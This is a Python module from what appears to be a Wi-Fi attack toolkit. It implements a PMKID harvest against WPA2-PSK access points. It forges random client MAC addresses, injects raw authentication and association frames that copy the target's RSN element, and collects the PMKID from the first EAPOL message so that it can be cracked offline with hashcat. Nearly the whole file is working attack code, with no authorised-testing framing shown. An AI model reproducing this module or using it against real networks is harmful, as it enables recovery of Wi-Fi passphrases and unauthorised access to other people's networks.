"""PMKID harvest attack (hcxdumptool-style, native).

Sequence per attempt:
    1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
    2. Listen briefly for Auth Resp (status=0 means the AP will engage).
    3. Inject Assoc Req carrying the AP's exact RSN IE + SSID + rates.
    4. Wait for the AP's EAPOL M1 — many WPA2-PSK APs ship a PMKID KDE in
       the Key Data. The existing frame parser surfaces it as
       ``parsed['eapol_pmkid']`` and the WlanInterface populates
       ``AP.handshakes[source].pmkid`` for free.

The attack itself returns the harvested 16-byte PMKID (or ``None`` if the
AP doesn't include one / times out). Cracker-side, the existing
``engine/hc22000.write_hc22000`` writes a ``WPA*01*…`` hashline whenever
``hs.pmkid`` is set.
"""

from __future__ import annotations

import asyncio
import logging
import os
import struct
import time
from typing import Optional

from wifit3.engine.models import AccessPoint

logger = logging.getLogger(__name__)


def _mac_bytes_to_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


# Standard supported rates IE (tag 1). Basic-rate bit (0x80) on the b/g
# mandatory rates. Encoded in 500 kbps units. The exact menu doesn't
# matter much — APs only check it's well-formed.
_SUPPORTED_RATES = bytes([
    0x82, 0x84, 0x8B, 0x96,         # 1, 2, 5.5, 11 (basic)
    0x0C, 0x12, 0x18, 0x24,         # 6, 9, 12, 18
])
_EXT_SUPPORTED_RATES = bytes([
    0x30, 0x48, 0x60, 0x6C,         # 24, 36, 48, 54
])

# Generic WPA2-PSK-CCMP RSN IE used when the AP's own IE is unavailable.
# Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
_GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")


def _str_to_mac(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast bit clear)."""
    rnd = os.urandom(5)
    return bytes([0x02]) + rnd


class PmkidHarvestAttack:
    """Run a PMKID harvest against a single AP."""

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        # Register with the interface so client/handshake registration
        # ignores these MACs (they're not real clients).
        self.iface.register_forged_mac(self.source_mac)

    def _rotate_mac(self) -> None:
        self.source_mac = _random_client_mac()
        self.iface.register_forged_mac(self.source_mac)

    # ---- Frame builders -----------------------------------------------------

    def _build_auth_req(self) -> bytes:
        """802.11 Authentication Request (Open System, seq=1)."""
        # FC: type=mgmt(0), subtype=auth(0x0B) → 0xB0
        mac_hdr = (
            b"\xb0\x00"                         # FC
            + b"\x00\x00"                       # Duration
            + self.bssid_bytes                  # Addr1 = BSSID (dest)
            + self.source_mac                   # Addr2 = us (source)
            + self.bssid_bytes                  # Addr3 = BSSID
            + b"\x00\x00"                       # Seq (hardware fills)
        )
        # Auth body: algo=0 (Open), seq=1, status=0
        body = b"\x00\x00" + b"\x01\x00" + b"\x00\x00"
        return mac_hdr + body

    def _build_assoc_req(self) -> bytes:
        """802.11 Association Request carrying SSID + rates + RSN IE."""
        # FC: type=mgmt(0), subtype=assoc_req(0x00) → 0x00
        mac_hdr = (
            b"\x00\x00"
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        # Capability Info (2B LE) — ESS + Privacy.
        cap_info = struct.pack("<H", 0x0011)
        # Listen interval (2B LE).
        listen_int = struct.pack("<H", 0x0001)

        # Tag 0: SSID. We tolerate hidden / unknown SSIDs by sending zero-length
        # — the AP should still respond on its BSSID. Most APs require the
        # real SSID though, so prefer it if we have one.
        ssid = (self.target.ssid or "").encode("utf-8", errors="ignore")[:32]
        ssid_ie = bytes([0x00, len(ssid)]) + ssid

        # Tag 1: Supported Rates
        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
        # Tag 50: Extended Supported Rates
        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES

        # Tag 48: RSN IE — echo the AP's exact bytes if we have them, else
        # fall back to a generic WPA2-PSK-CCMP IE.
        rsn_ie = self.target.rsn_ie or _GENERIC_RSN_IE

        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + rsn_ie
        return mac_hdr + body

    # ---- Driver -------------------------------------------------------------

    def _harvested_pmkid(self) -> Optional[bytes]:
        """Check if the parser-side has already populated a PMKID for our
        current forged client MAC on this AP."""
        ap_state = self.iface.access_points.get(self.target.bssid.lower())
        if not ap_state:
            return None
        mac_str = _mac_bytes_to_str(self.source_mac)
        hs = ap_state.handshakes.get(mac_str)
        if hs and hs.pmkid:
            return hs.pmkid
        return None

    async def run(
        self,
        attempts: int = 3,
        m1_timeout: float = 2.0,
    ) -> Optional[bytes]:
        """Try ``attempts`` rounds. Returns 16-byte PMKID on success, else None."""

        # Make sure we're on the AP's channel — Focus already tunes here,
        # but be defensive.
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        for attempt in range(1, attempts + 1):
            logger.info(
                f"[PMKID] Attempt {attempt}/{attempts}: Auth + Assoc Req to "
                f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
            )
            await self.iface.send_raw(self._build_auth_req(), use_no_ack=True)
            # No explicit Auth Resp poll — the parser/state path handles
            # passive reception, and many APs don't require an interleave
            # delay anyway. Tiny pause so the AP processes the Auth before
            # the Assoc lands.
            await asyncio.sleep(0.1)
            await self.iface.send_raw(self._build_assoc_req(), use_no_ack=True)

            # Poll the parser-populated handshake dict for our forged MAC.
            deadline = time.time() + m1_timeout
            while time.time() < deadline:
                pmkid = self._harvested_pmkid()
                if pmkid:
                    logger.info(
                        f"[PMKID] Harvested {pmkid.hex()} from {self.target.bssid} "
                        f"(STA {_mac_bytes_to_str(self.source_mac)})"
                    )
                    return pmkid
                await asyncio.sleep(0.05)

            logger.info(
                f"[PMKID] Attempt {attempt} timed out — rotating MAC and retrying."
            )
            self._rotate_mac()

        return None
